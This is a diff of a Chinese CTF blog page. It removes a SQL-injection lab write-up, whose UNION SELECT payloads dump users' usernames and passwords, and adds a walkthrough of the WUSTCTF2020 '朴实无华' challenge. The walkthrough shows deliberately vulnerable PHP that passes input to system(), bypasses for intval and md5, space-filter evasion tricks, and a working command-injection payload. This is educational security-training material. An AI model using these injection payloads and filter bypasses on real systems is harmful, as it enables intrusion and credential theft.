@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>Level1~~level4 - lll-nnnのblog</title>
+  <title>BUU每日一题 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Level1~~level4">
+            <span class="h2" id="subtitle" title="BUU每日一题">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-01-17 15:02" pubdate>
-        2021年1月17日 下午
+      <time datetime="2021-03-10 10:47" pubdate>
+        2021年3月10日 上午
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      403 字
+      717 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      10
        分钟
     </span>
   
@@ -224,18 +224,83 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Level1~~level4</h1>
+            <h1 style="display: none">BUU每日一题</h1>
             
             <div class="markdown-body">
-              <h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>输入id=1,有回显；此外，2，3，4……12均有回显，说明有12条数据。</p>
-<p>接下来使用<code>order by 1 %23</code><br><code>order by 1,2 %23</code><br>…….<br>得到一共有三列<br>将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面的显示位。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/7fe5a0b12e1c7810.png" srcset="/img/loading.gif"><br>2，3两个显示位；<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 %23</code> 得到库名<img src="https://ftp.bmp.ovh/imgs/2021/01/e273266cd62bab04.png" srcset="/img/loading.gif"><br>获取security库中的表<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;) %23</code><img src="https://ftp.bmp.ovh/imgs/2021/01/bff49f0f721798e4.png" srcset="/img/loading.gif"><br>users下的列名<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/fd5c32324cb27880.png" srcset="/img/loading.gif"></p>
-<p>username:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/a68dcca44529904f.png" srcset="/img/loading.gif"><br>password:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(password) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/79f09d504315ca8b.png" srcset="/img/loading.gif">            </p>
-<hr>
-<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>?id=1</code>正常输出<br><code>?id=1&#39;</code>报错<br><code>?id=1&quot;</code>报错<br><code>?id=3-1</code>正常输出<br>判断为数值型注入<br><code>?id=33 union select 1,2,3%23</code>正常回显<br>按第一关的步骤可以得出      </p>
-<hr>
-<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><code>?id=1&#39;</code>报错<br><code>?id=1&quot;</code>正常输出<br>本来以为是<code>&quot;&quot;</code>的闭合，但后面的操作进行不出来；<br><code>?id=1&#39;)%23</code>也能正常输出<br><code>?id=1&#39;) order by 1,2,3,4%23</code>报错输出<br><code>?id=1&#39;) union select 1,2,3%23</code>正常输出<br>所以应该是<code>(&#39;&#39;)</code>的闭合     </p>
-<hr>
-<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><code>?id=1&#39;</code>正常输出<br><code>?id=1&quot;%23</code>报错<br><code>?id=1&#39;)%23</code>正常输出，但<code>order by 1,2,3,4</code>没有报错<br><code>?id=1&quot;)%23</code>正常输出<br><code>?id=1&quot;) order by 1,2,3,4%23</code>正常报错<br>说明闭合形式为<code>(&quot;&quot;)</code></p>
+              <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[WUSTCTF2020]朴实无华<br><img src="https://ftp.bmp.ovh/imgs/2021/03/273a5c946a150017.png" srcset="/img/loading.gif">      </p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>没啥东西，看看<code>robots.txt</code>         </p>
+<div class="hljs"><pre><code>User-agent: *
+Disallow: /fAke_f1agggg.php     </code></pre></div>
+<p>访问<br><img src="https://ftp.bmp.ovh/imgs/2021/03/3f6fe65b4f82f8c7.png" srcset="/img/loading.gif"><br>访问后出现源码      </p>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);
+error_reporting(<span class="hljs-number">0</span>);
+highlight_file(<span class="hljs-keyword">__file__</span>);
+
+
+<span class="hljs-comment">//level 1</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;
+    $num = $_GET[<span class="hljs-string">&#x27;num&#x27;</span>];
+    <span class="hljs-keyword">if</span>(intval($num) &lt; <span class="hljs-number">2020</span> &amp;&amp; intval($num + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);
+    &#125;
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);
+&#125;
+<span class="hljs-comment">//level 2</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;
+   $md5=$_GET[<span class="hljs-string">&#x27;md5&#x27;</span>];
+   <span class="hljs-keyword">if</span> ($md5==md5($md5))
+       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;
+   <span class="hljs-keyword">else</span>
+       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);
+&#125;
+
+<span class="hljs-comment">//get flag</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;
+    $get_flag = $_GET[<span class="hljs-string">&#x27;get_flag&#x27;</span>];
+    <span class="hljs-keyword">if</span>(!strstr($get_flag,<span class="hljs-string">&quot; &quot;</span>))&#123;
+        $get_flag = str_ireplace(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, $get_flag);
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;
+        system($get_flag);
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);
+    &#125;
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span>
+去非洲吧</code></pre></div></code></pre>
+<p>第一个：<br>intval函数——–&gt;获取变量的整数值      </p>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>);                      <span class="hljs-comment">// 42</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">4.2</span>);                     <span class="hljs-comment">// 4</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>);                    <span class="hljs-comment">// 42</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;+42&#x27;</span>);                   <span class="hljs-comment">// 42</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;-42&#x27;</span>);                   <span class="hljs-comment">// -42</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">042</span>);                     <span class="hljs-comment">// 34</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;042&#x27;</span>);                   <span class="hljs-comment">// 42</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">1e10</span>);                    <span class="hljs-comment">// 1410065408</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;1e10&#x27;</span>);                  <span class="hljs-comment">// 1</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">0x1A</span>);                    <span class="hljs-comment">// 26</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42000000</span>);                <span class="hljs-comment">// 42000000</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">420000000000000000000</span>);   <span class="hljs-comment">// 0</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;420000000000000000000&#x27;</span>); <span class="hljs-comment">// 2147483647</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>, <span class="hljs-number">8</span>);                   <span class="hljs-comment">// 42</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>, <span class="hljs-number">8</span>);                 <span class="hljs-comment">// 34</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>());                 <span class="hljs-comment">// 0</span>
+<span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>));     <span class="hljs-comment">// 1</span>
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<p>字符串<code>&#39;1e11&#39;</code>—-1<br>数字<code>1e10</code>——&gt;1410065408<br>利用这个绕过<br><code>num=2019e11</code><br>第二个：<br>MD5：<code>$a==md5($a)</code>———&gt;<code>0e215962017</code><br>第三个：<br>命令执行<br>ls<br><code>404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt </code><br>空格被过，用<code>$IFS$9</code>绕过,php环境下<code>%09</code>也可绕过空格<br>cat变成ca\t可绕过，也可直接tac        </p>
+<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>?num=2019e11&amp;md5=0e215962017&amp;get_flag=ca\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code>        </p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><code>$IFS</code>也可以绕过空格，但是<code>ls$IFS/</code>能执行，而<code>tac$IFSflag</code>却不能执行成功，为什么呢？        </p>
+<p><code>$&#123;IFS&#125;,$IFS,$IFS$9的区别</code><br>单纯的<code>cat$IFS2</code>,bash解释器会把整个<code>IFS2</code>当做变量名，所以导致输不出来结果，然而如果加一个<code>&#123;&#125;</code>就固定了变量名，同理在后面加个<code>$</code>可以起到截断的作用，但是为什么要用<code>$9</code>呢，因为<code>$9</code>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。      </p>
+<p>对于 <code>&gt;,+</code> 等 符号的过滤 , <code>$PS2</code>变量为<code>&gt;</code>,<code>$PS4</code>变量则为<code>+</code>            </p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/137923.html">MORE</a></p>
 
             </div>
             <hr>
@@ -246,7 +311,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/noet/">noet</a>
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
                     
                   </div>
                 
@@ -259,18 +324,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/18/BUU004/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUU每日一题004</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/01/17/BUU003/">
-                        <span class="hidden-mobile">BUU每日一题003</span>
+                      <a href="/2021/03/09/BUU048/">
+                        <span class="hidden-mobile">BUU每日一题</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
